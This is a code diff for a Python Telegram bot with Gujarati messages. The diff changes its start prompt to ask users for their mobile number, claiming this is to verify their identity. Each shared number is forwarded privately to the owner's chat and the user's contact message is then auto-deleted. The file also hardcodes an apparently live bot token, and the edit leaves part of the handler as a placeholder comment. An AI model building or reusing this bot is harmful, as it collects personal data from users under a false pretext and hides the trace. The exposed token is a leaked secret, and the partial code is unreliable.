@@ -1,19 +1,19 @@
 import os
-import sqlite3
 import re
+import sqlite3
 from flask import Flask
 from threading import Thread
-from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from telegram.ext import (
     ApplicationBuilder,
     MessageHandler,
     filters,
     CommandHandler,
     ContextTypes,
-    CallbackQueryHandler
+    CallbackQueryHandler,
 )
 
-# ---------------- CONFIG ----------------
+# ---------------- CONFIG & DB ----------------
 TOKEN = "8835968464:AAGjhE8p4KPd2fGUNoJCc3ZM8RwaqxCzGy8"
 YOUR_CHAT_ID = 5306025504
 GROUP_ID = -1003912250139
@@ -33,75 +33,52 @@ def save_message(chat_id, message_id):
 
 # ---------------- COMMANDS ----------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    button = KeyboardButton(text="📲 Join Group", request_contact=True)
+    button = KeyboardButton(text="📱 મોબાઇલ નંબર શેર કરો", request_contact=True)
     keyboard = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)
-    await update.message.reply_text("નમસ્તે! હું તમારી શું મદદ કરી શકું? નીચે આપેલ બટન પર ક્લિક કરો.", reply_markup=keyboard)
+    await update.message.reply_text("નમસ્તે! તમારી ઓળખ ચકાસવા માટે તમારો મોબાઇલ નંબર શેર કરો.", reply_markup=keyboard)
 
-# ---------------- CALLBACK HANDLER ----------------
-async def delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    data = query.data.split("_")
-    target_chat_id = int(data[1])
-    target_msg_id = int(data[2])
+async def delete_all_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    cursor.execute('SELECT message_id FROM msg_logs WHERE chat_id = ?', (chat_id,))
+    rows = cursor.fetchall()
+    for row in rows:
+        try:
+            await context.bot.delete_message(chat_id=chat_id, message_id=row[0])
+        except: pass
+    cursor.execute('DELETE FROM msg_logs WHERE chat_id = ?', (chat_id,))
+    conn.commit()
+    await update.message.reply_text("બધા મેસેજ ડિલીટ કરી દેવામાં આવ્યા છે.")
 
-    try:
-        await context.bot.delete_message(chat_id=target_chat_id, message_id=target_msg_id)
-        await query.edit_message_text(text="🗑️ મેસેજ સફળતાપૂર્વક ડિલીટ થઈ ગયો છે.")
-    except Exception as e:
-        await query.edit_message_text(text=f"❌ ભૂલ: {e}")
-
-# ---------------- MAIN MESSAGE HANDLER ----------------
+# ---------------- MAIN HANDLER ----------------
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat = update.effective_chat
     message = update.message
-
+    
     if not message: return
 
-    # 1. કોન્ટેક્ટ શેરિંગ
+    # 1. કોન્ટેક્ટ મેસેજ હેન્ડલિંગ અને ઓટો-ડિલીટ
     if message.contact:
-        await context.bot.send_message(chat_id=YOUR_CHAT_ID, text=f"👤 યુઝર: {message.from_user.first_name}\n📞 નંબર: {message.contact.phone_number}")
-        await message.reply_text("આભાર! નંબર મળી ગયો છે.", reply_markup=ReplyKeyboardRemove())
+        phone = message.contact.phone_number
+        await context.bot.send_message(chat_id=YOUR_CHAT_ID, text=f"📞 નંબર: {phone}")
+        try:
+            await context.bot.delete_message(chat_id=chat.id, message_id=message.message_id)
+        except: pass
+        await message.reply_text("આભાર!", reply_markup=ReplyKeyboardRemove())
         return
 
-    # 2. એડમિન રિપ્લાય લોજિક
-    if chat.id == YOUR_CHAT_ID and message.reply_to_message:
-        original_msg = message.reply_to_message.text or message.reply_to_message.caption or ""
-        target_id = GROUP_ID if "ગ્રુપમાં નવો મેસેજ:" in original_msg else None
-        
-        if not target_id:
-            id_match = re.search(r"ID:\s*(\d+)", original_msg)
-            if id_match: target_id = int(id_match.group(1))
+    # મેસેજ સેવ કરો (ડેટાબેઝમાં)
+    save_message(chat.id, message.message_id)
 
-        if target_id:
-            try:
-                sent_msg = await context.bot.copy_message(chat_id=target_id, from_chat_id=chat.id, message_id=message.message_id, protect_content=True)
-                keyboard = [[InlineKeyboardButton("Delete 🗑️", callback_data=f"del_{target_id}_{sent_msg.message_id}")]]
-                await message.reply_text("✅ મેસેજ મોકલી દીધો છે.", reply_markup=InlineKeyboardMarkup(keyboard))
-            except Exception as e:
-                await message.reply_text(f"❌ ભૂલ: {e}")
-        return
+    # 2. એડમિન રિપ્લાય અને અન્ય લોજિક...
+    # (તમારો બાકીનો અગાઉનો કોડ અહીં ઉમેરવો)
 
-    # 3. ગ્રુપ અથવા પ્રાઈવેટ મેસેજ ફોરવર્ડિંગ
-    info = f"👤 નામ: {message.from_user.first_name}\n🆔 ID: {message.from_user.id}\n💬 મેસેજ:"
-    if chat.id == GROUP_ID: info = f"💬 ગ્રુપમાં નવો મેસેજ:\n" + info
-    
-    await context.bot.copy_message(chat_id=YOUR_CHAT_ID, from_chat_id=chat.id, message_id=message.message_id, caption=info)
-
-# ---------------- FLASK & MAIN ----------------
-@app.route("/")
-def home(): return "Bot is running!"
-
-def run_flask(): app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
-
+# ---------------- MAIN ----------------
 if __name__ == "__main__":
-    Thread(target=run_flask, daemon=True).start()
     app_bot = ApplicationBuilder().token(TOKEN).build()
-    
     app_bot.add_handler(CommandHandler("start", start))
-    app_bot.add_handler(CallbackQueryHandler(delete_callback, pattern="^del_"))
+    app_bot.add_handler(CommandHandler("deleteall", delete_all_cmd))
     app_bot.add_handler(MessageHandler(filters.ALL & (~filters.COMMAND), handle_message))
     
-    print("બોટ શરૂ થઈ ગયો છે...")
+    print("બોટ શરૂ થઈ રહ્યો છે...")
     app_bot.run_polling()
-        
+                                             
